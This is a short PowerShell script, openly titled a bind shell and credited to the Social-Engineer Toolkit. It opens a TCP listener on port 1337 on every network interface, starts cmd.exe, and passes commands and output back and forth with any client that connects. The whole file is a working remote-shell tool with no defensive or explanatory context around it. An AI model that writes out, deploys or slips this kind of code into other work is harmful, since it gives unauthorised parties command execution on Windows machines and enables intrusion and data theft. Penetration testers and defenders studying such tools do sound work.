# Powershell bindshell
# Taken from SET: https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/powershell/bind.powershell

# Set your port
$PORT = 1337

$encoding = new-object System.Text.AsciiEncoding
$endpoint = new-object System.Net.IpEndpoint ([System.Net.Ipaddress]::any, 1337)
$listener = new-object System.Net.Sockets.TcpListener $endpoint
$listener.start()
$socket = $listener.AcceptTcpClient()
$networkstream = $socket.GetStream()
$networkbuffer = New-Object System.Byte[] $socket.ReceiveBufferSize
$process = New-Object System.Diagnostics.Process 
$process.StartInfo.FileName = "C:\\windows\\system32\\cmd.exe"
$process.StartInfo.RedirectStandardInput = 1
$process.StartInfo.RedirectStandardOutput = 1
$process.StartInfo.UseShellExecute = 0
$process.Start()
$inputstream = $process.StandardInput
$outputstream = $process.StandardOutput
 
Start-Sleep 1
 
while($outputstream.Peek() -ne -1){
    $string += $encoding.GetString($outputstream.Read())
}
$networkstream.Write($encoding.GetBytes($string),0,$string.Length)
$string = '' 
$done = $false
while (-not $done) {
    $pos = 0
    $i = 1
    while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
                    $read = $networkstream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
        $pos+=$read
        if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {
            break
        }
    }
    if ($pos -gt 0) {
        $string = $encoding.GetString($networkbuffer,0,$pos)
        $inputstream.write($string)
        
        # Write Output
        $out = $encoding.GetString($outputstream.Read())
        while($outputstream.Peek() -ne -1){
            $out += $encoding.GetString($outputstream.Read())
        }
        $networkstream.Write($encoding.GetBytes($out),0,$out.length)
        $out = $null
    }
    else {
        $done = $true
    }
}          
